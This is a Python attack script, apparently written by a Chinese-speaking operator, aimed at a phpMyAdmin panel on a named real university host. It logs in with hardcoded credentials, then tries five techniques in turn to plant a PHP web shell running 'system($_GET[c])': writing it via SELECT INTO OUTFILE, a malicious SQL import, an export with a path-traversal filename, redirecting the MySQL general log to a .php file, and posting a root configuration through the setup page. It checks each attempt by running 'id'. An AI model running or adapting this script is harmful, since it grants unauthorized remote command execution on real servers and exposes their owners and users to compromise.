#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 终极方法：通过phpMyAdmin的所有可能功能写入shell
print("[*] 方法1: 直接写入到已知存在的目录...")
write_paths = [
    "/var/www/html/enmeeting/shell.php",
    "/var/www/html/enmeeting/s.php",
    "/var/www/html/enmeeting/c.php",
    "/var/www/html/shell.php",
    "/var/www/html/s.php",
]

for write_path in write_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{write_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(1)
    http_path = write_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 方法2: 通过数据库备份恢复
print("[*] 方法2: 数据库备份恢复...")
backup_content = """SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/enmeeting/shell.php';
"""
files = {"import_file": ("shell.sql", backup_content, "application/sql")}
data = {"format": "sql", "token": token, "db": "scmeeting", "sql_compatibility": "NONE", "import_type": "sql"}

import_resp = session.post(url + "db_import.php", params={"token": token, "db": "scmeeting"}, files=files, data=data, verify=False, timeout=10)

time.sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功(备份恢复): https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法3: 通过phpMyAdmin的导出功能
print("[*] 方法3: 导出功能...")
# 创建表
sql = "CREATE TABLE IF NOT EXISTS scmeeting.s(code TEXT); INSERT INTO scmeeting.s VALUES('<?php system($_GET[\"c\"]); ?>');"
sql_data = {"sql_query": sql, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

# 导出
export_data = {
    "export_type": "sql",
    "what": "sql",
    "sql_query": "SELECT code FROM scmeeting.s;",
    "asfile": "savefile",
    "filename_template": "../../../../var/www/html/enmeeting/shell.php",
}

export_resp = session.post(url + "db_export.php", params={"token": token, "db": "scmeeting"}, data=export_data, verify=False, timeout=10)

time.sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功(导出): https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法4: 通过数据库日志
print("[*] 方法4: 数据库日志...")
for log_path in ["/var/www/html/enmeeting/log.php", "/var/www/html/log.php"]:
    sql = f"SET GLOBAL general_log_file = '{log_path}';"
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data={"sql_query": sql}, verify=False)
    
    sql = "SET GLOBAL general_log = 'ON';"
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data={"sql_query": sql}, verify=False)
    
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>';"
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data={"sql_query": sql}, verify=False)
    
    sql = "SET GLOBAL general_log = 'OFF';"
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data={"sql_query": sql}, verify=False)
    
    time.sleep(1)
    http_path = log_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功(日志): {test_url}")
        exit(0)

# 方法5: 通过phpMyAdmin的setup功能
print("[*] 方法5: setup功能...")
setup_url = url + "setup/"
setup_resp = requests.get(setup_url, verify=False, timeout=5)
if setup_resp.status_code == 200:
    setup_token_match = re.search(r'token=([a-f0-9]+)', setup_resp.text)
    if setup_token_match:
        setup_token = setup_token_match.group(1)
        # 尝试保存配置
        setup_data = {
            "token": setup_token,
            "Servers/1/host": "localhost",
            "Servers/1/user": "root",
            "Servers/1/password": "",
        }
        setup_post = requests.post(setup_url + "index.php", data=setup_data, verify=False, timeout=5)

print("[-] 所有方法尝试完毕")
